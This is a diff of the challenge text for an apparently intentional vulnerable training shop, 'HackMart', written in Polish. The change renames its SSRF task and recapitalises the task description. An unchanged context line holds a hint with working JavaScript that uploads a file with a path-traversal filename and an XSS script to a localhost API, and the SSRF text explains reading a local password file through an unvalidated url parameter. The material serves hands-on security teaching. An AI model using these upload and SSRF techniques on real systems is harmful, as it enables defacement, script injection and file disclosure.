@@ -79,8 +79,8 @@
       "hint5": "```js\nconst token = localStorage.getItem(\"token\");\n\nconst formData = new FormData();\nformData.append(\"name\", \"testowy\");\nformData.append(\"price\", \"13.99\");\nformData.append(\"stock\", \"5\");\n\nconst fileContent = \"<h1>Hak!</h1><script>alert('XSS')</script>\";\nconst file = new File([fileContent], \"../src/main/resources/static/hacked.html\", { type: \"text/html\" });\nformData.append(\"image\", file);\n\nfetch(\"http://localhost:7000/api/products\", {\n  method: \"POST\",\n  headers: {\n    Authorization: token\n  },\n  body: formData\n});\n```"
     },
     "ssrf": {
-      "title": "SSRF – Misja z ukrytym hasłem",
-      "description": "serwer aplikacji pozwala na pobieranie zewnętrznych plików przez parametr `url` w endpointzie `/api/fetch`. Brakuje jednak walidacji tego adresu, co pozwala na tzw. Server-Side Request Forgery (SSRF). Możliwe jest wykorzystanie tej podatności do odczytania plików znajdujących się lokalnie na serwerze.",
+      "title": "Server-Side Request Forgery",
+      "description": "Serwer aplikacji pozwala na pobieranie zewnętrznych plików przez parametr `url` w endpointzie `/api/fetch`. Brakuje jednak walidacji tego adresu, co pozwala na tzw. Server-Side Request Forgery (SSRF). Możliwe jest wykorzystanie tej podatności do odczytania plików znajdujących się lokalnie na serwerze.",
       "task": "Twoim celem jest odczytanie zawartości pliku `password.txt`, który znajduje się w katalogu głównym serwera. Plik ten zawiera sekret potrzebny do zaliczenia zadania.",
       "hint0": "Zajrzyj na stronę główną HackMart i zobacz, w jaki sposób ładowane są loga partnerów. Zwróć uwagę na URL, który je ładuje.",
       "hint1": "Endpoint `/api/fetch` przyjmuje parametr `url`, który może wskazywać na dowolny zewnętrzny adres. Czy możesz go użyć również do wskazania pliku zamiast obrazka?",
